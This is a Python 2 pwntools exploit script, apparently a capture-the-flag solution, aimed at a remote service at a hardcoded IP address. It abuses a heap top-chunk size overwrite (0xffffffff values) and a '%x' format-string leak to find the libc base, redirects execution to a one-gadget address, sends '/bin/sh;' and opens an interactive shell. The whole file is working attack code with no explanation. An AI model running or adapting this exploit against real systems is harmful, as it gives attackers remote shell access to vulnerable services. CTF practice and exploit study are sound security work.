import socket
import struct
import telnetlib
import time
from pwn import *
from hexdump import *
def read_until(s,string):
	r = ""
	while not r.endswith(string):
		tmp = s.recv(1)
		#if not tmp: break
		r += tmp
	return r

#s = socket.create_connection(['0',1234])
#s = socket.create_connection(['112.166.114.137', 16388])
#s = remote('0',1234)
s = remote('112.166.114.137', 16389)
k = raw_input('')
read_until(s,'size :')
dat = ""
dat += "A"*8
dat += struct.pack('<I',0xffffffff)
dat += struct.pack('<I',0xffffffff)
s.send("4\n")
top_chunk = int(s.recvuntil('bmp')[0x30:0x3a],16)+0xc
print "[+] top_chunk  %s"%hex(top_chunk)
s.send(dat+"\n")
s.recvuntil(')?') 
s.send('yes%x%x\n')
s.recvuntil('size :')
size = ((0x804a040-8-8-8)-top_chunk)
s.send(str(size)+'\n')
s.recvuntil('bmp')
#s.send('\n')
s.recvuntil(')')
s.send('yes%x%x\n')
s.recvuntil('size :')
dat = struct.pack("<I",0x8048550)
#dat = struct.pack("<I",0x42424242)
#dat += struct.pack("<I",0x804B0f0)

#dat += struct.pack("<I",0x8048EDD)
#dat += struct.pack("<I",0x42424242)
#dat += struct.pack("<I",0x42424242)
#dat += struct.pack("<I",0x42424242)
#dat += struct.pack("<I",0x8048F3C)
#dat += struct.pack("<I",0x80484f0)
#dat += struct.pack('<I',0x8048506)
#dat += struct.pack('<I',0x8048510)
#dat += struct.pack('<I',0x80484f0)

s.send(str(len(dat)+200)+'\n')
s.recvuntil(')')
time.sleep(1)
s.send(dat)
#s.interactive()
libc_base = struct.unpack('<I',s.recvuntil('no')[0xb4:0xb8])[0]-0x1b2da7
magic = libc_base+0x003AC49
magic = libc_base + 0x003AD80
print hex(libc_base)
#raw_input()
print hex(magic)
#s.send(struct.pack('<I',0x80484F0)*2)
#t = telnetlib.Telnet()
#t.sock = s
#t.interact()
s.send('yes\n')
dat = ""
dat += "A"*8
dat += struct.pack('<I',0xffffffff)
dat += struct.pack('<I',0xffffffff)
s.send("4\n")
time.sleep(1)
s.send(dat+'\n')
s.send('yes\n')
size = ((0x804b030-8-8-8)-0x804b108+0xc)
time.sleep(1)
s.send(str(size)+'\n')
time.sleep(1)
#s.send('\n')
s.send('yes\n')
time.sleep(1)
s.send('4\n')
s.send(struct.pack('<I',magic)*4)
s.send('/bin/sh;\n')
print [s.recv(1024)]
s.interactive()
